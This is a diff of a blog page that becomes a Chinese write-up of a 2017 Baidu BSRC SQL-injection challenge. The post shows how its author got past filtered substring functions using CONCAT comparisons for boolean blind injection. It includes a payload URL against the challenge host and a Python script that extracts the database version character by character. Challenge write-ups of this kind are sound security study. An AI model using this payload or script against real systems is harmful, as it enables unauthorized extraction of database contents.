@@ -4,14 +4,42 @@
   <meta charset="utf-8">
   
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
-  <title>Tag: 大学生活 | s1m0n|探索 好奇心</title>
+  <title>百度BSRC SQL注入挑战赛部分writeup | s1m0n|探索 好奇心</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="s1m0n|探索 好奇心">
-<meta property="og:url" content="http://blog.nudtcat.org/tags/大学生活/index.html">
+  <meta name="description" content="0x01 介绍百度BSRC在4月底举办了一个SQL注入挑战赛，以靶机的形式供安全测试人员攻击。
+活动发布在百度安全应急响应中心微信公众号，判定标准分为两档：
+
+
+读取mysql系统信息(user,version)或数据库名
+通过SQL注入读取表内secret数据
+
+
+比赛时间是4月28到5月1日24点，等我看到这个比赛的时候已经5月1日晚上9点多了，5月1日24点以后靶机就停止运行了，水平有限，只">
+<meta property="og:type" content="article">
+<meta property="og:title" content="百度BSRC SQL注入挑战赛部分writeup">
+<meta property="og:url" content="http://blog.nudtcat.org/SQL注入/百度BSRC-SQL注入挑战赛部分writeup/index.html">
 <meta property="og:site_name" content="s1m0n|探索 好奇心">
+<meta property="og:description" content="0x01 介绍百度BSRC在4月底举办了一个SQL注入挑战赛，以靶机的形式供安全测试人员攻击。
+活动发布在百度安全应急响应中心微信公众号，判定标准分为两档：
+
+
+读取mysql系统信息(user,version)或数据库名
+通过SQL注入读取表内secret数据
+
+
+比赛时间是4月28到5月1日24点，等我看到这个比赛的时候已经5月1日晚上9点多了，5月1日24点以后靶机就停止运行了，水平有限，只">
+<meta property="og:updated_time" content="2017-05-11T01:21:34.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="s1m0n|探索 好奇心">
+<meta name="twitter:title" content="百度BSRC SQL注入挑战赛部分writeup">
+<meta name="twitter:description" content="0x01 介绍百度BSRC在4月底举办了一个SQL注入挑战赛，以靶机的形式供安全测试人员攻击。
+活动发布在百度安全应急响应中心微信公众号，判定标准分为两档：
+
+
+读取mysql系统信息(user,version)或数据库名
+通过SQL注入读取表内secret数据
+
+
+比赛时间是4月28到5月1日24点，等我看到这个比赛的时候已经5月1日晚上9点多了，5月1日24点以后靶机就停止运行了，水平有限，只">
   
     <link rel="alternative" href="/atom.xml" title="s1m0n|探索 好奇心" type="application/atom+xml">
   
@@ -129,59 +157,130 @@
 </nav>
 
       <div class="body-wrap">
+        <article id="post-百度BSRC-SQL注入挑战赛部分writeup" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
         
   
-  
-    
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2016" class="archive-year">2016</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/Chat/集训有感/" class="archive-article-date">
-  	<time datetime="2016-12-19T08:04:57.000Z" itemprop="datePublished"><i class="icon-clock"></i>2016-12-19</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/Chat/集训有感/">集训有感</a>
+    <h1 class="article-title" itemprop="name">
+      百度BSRC SQL注入挑战赛部分writeup
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="0x01-介绍"><a href="#0x01-介绍" class="headerlink" title="0x01 介绍"></a>0x01 介绍</h2><p>百度BSRC在4月底举办了一个SQL注入挑战赛，以靶机的形式供安全测试人员攻击。</p>
+<p>活动发布在百度安全应急响应中心微信公众号，判定标准分为两档：</p>
+<blockquote>
+<ol>
+<li>读取mysql系统信息(user,version)或数据库名</li>
+<li>通过SQL注入读取表内secret数据</li>
+</ol>
+</blockquote>
+<p>比赛时间是4月28到5月1日24点，等我看到这个比赛的时候已经5月1日晚上9点多了，5月1日24点以后靶机就停止运行了，水平有限，只达到第一档的标准，而且也不是最早提交case的。另外，由于靶机已经关闭，下文关于靶机的描述可能存在偏差。</p>
+<h2 id="0x02-过滤与绕过"><a href="#0x02-过滤与绕过" class="headerlink" title="0x02 过滤与绕过"></a>0x02 过滤与绕过</h2><p>靶机url：<a href="http://sqlitest.anquanbao.com.cn/api/query?art_id=1" target="_blank" rel="external">http://sqlitest.anquanbao.com.cn/api/query?art_id=1</a></p>
+<p>靶机屏蔽了错误信息，因此基于报错的注入无法进行，从测试来看，盲注的可能性很大。</p>
+<p>经过测试，发现1在SQL语句中是整数。</p>
+<p>靶机过滤了一些基本的字符串处理函数，mid,left,right,substr,substring等函数都被过滤。<br><a id="more"></a></p>
+<p>无法将字符串分开就无法跑盲注，靶机过滤了所有的字符串分割函数，怎样才能让字符串中的字符一个一个跑出来呢？</p>
+<p>答案是使用concat，我的绕过方法是通过concat与字符串比较大小，造成基于布尔型的注入。</p>
+<p>payload:<a href="http://sqlitest.anquanbao.com.cn/api/query?art_id=hex(user()%3CCONCAT(char(67" target="_blank" rel="external">http://sqlitest.anquanbao.com.cn/api/query?art_id=hex(user()%3CCONCAT(char(67</a>))) 在concat中不断增加字符即可做基于布尔类型的盲注。</p>
+<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment">#-*- coding:utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line">url=<span class="string">"http://sqlitest.anquanbao.com.cn/api/query?art_id=hex(version()&lt;CONCAT(%s))"</span></div><div class="line">pre=<span class="string">""</span></div><div class="line">i=<span class="number">0</span></div><div class="line">result=<span class="string">""</span></div><div class="line"><span class="keyword">while</span> i&lt;<span class="number">128</span>:</div><div class="line">    <span class="comment">#print url</span></div><div class="line">    r=requests.get(url%(pre+<span class="string">'char('</span>+str(i)+<span class="string">")"</span>))</div><div class="line">    <span class="keyword">print</span> r.url</div><div class="line">    <span class="keyword">if</span> len(r.text)&gt;<span class="number">203</span>:</div><div class="line">        <span class="keyword">if</span> i!=<span class="number">33</span>:</div><div class="line">            pre=pre+<span class="string">'char('</span>+str(i<span class="number">-1</span>)+<span class="string">'),'</span></div><div class="line">            result+=chr(i<span class="number">-1</span>)</div><div class="line">            <span class="keyword">print</span> result</div><div class="line">            i=<span class="number">0</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="keyword">break</span></div><div class="line">    i=i+<span class="number">1</span></div></pre></td></tr></table></figure>
+<p>获取的user和version如下：</p>
+<ul>
+<li>user():BSQLITEST@LOCALHOST</li>
+<li>version():5.5.54-0+DEB8U1</li>
+</ul>
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      <a href="/SQL注入/百度BSRC-SQL注入挑战赛部分writeup/" class="archive-article-date">
+  	<time datetime="2017-05-10T15:31:07.000Z" itemprop="datePublished"><i class="icon-clock"></i>2017-05-10</time>
+</a>
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/大学生活/">大学生活</a></li></ul>
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL注入/">SQL注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web安全/">web安全</a></li></ul>
 	</div>
 
-          
+      
 	<div class="article-category tagcloud">
 	<i class="icon-price-tags"></i>
-	<a class="article-category-link" href="/categories/Chat/">杂谈</a>
+	<a class="article-category-link" href="/categories/SQL注入/">SQL注入</a>
 	</div>
 
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
-  
-  
-    </div></section>
-  
 
-    
+  
+<nav id="article-nav">
+  
+  
+    <a href="/安全/先知大会后记/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">先知大会后记</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+
+
+<div class="share_jia">
+	<!-- JiaThis Button BEGIN -->
+	<div class="jiathis_style">
+		<span class="jiathis_txt">Share to: &nbsp; </span>
+		<a class="jiathis_button_facebook"></a> 
+	    <a class="jiathis_button_twitter"></a>
+	    <a class="jiathis_button_plus"></a> 
+	    <a class="jiathis_button_tsina"></a>
+		<a class="jiathis_button_cqq"></a>
+		<a class="jiathis_button_douban"></a>
+		<a class="jiathis_button_weixin"></a>
+		<a class="jiathis_button_tumblr"></a>
+    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jtico jtico_jiathis" target="_blank"></a>
+	</div>
+	<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js?uid=1405949716054953" charset="utf-8"></script>
+	<!-- JiaThis Button END -->
+</div>
+
+
+
+
+
+
+<div class="duoshuo">
+	<!-- 多说评论框 start -->
+	<div class="ds-thread" data-thread-key="百度BSRC-SQL注入挑战赛部分writeup" data-title="百度BSRC SQL注入挑战赛部分writeup" data-url="http://blog.nudtcat.org/SQL注入/百度BSRC-SQL注入挑战赛部分writeup/"></div>
+	<!-- 多说评论框 end -->
+	<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
+	<script type="text/javascript">
+	var duoshuoQuery = {short_name:"nudtcat"};
+	(function() {
+		var ds = document.createElement('script');
+		ds.type = 'text/javascript';ds.async = true;
+		ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+		ds.charset = 'UTF-8';
+		(document.getElementsByTagName('head')[0] 
+		 || document.getElementsByTagName('body')[0]).appendChild(ds);
+	})();
+	</script>
+	<!-- 多说公共JS代码 end -->
+</div>
+
+
+
 
 
       </div>
@@ -222,9 +321,9 @@
 		mathjax: true,
 		animate: true,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: true,
 		root: "/"
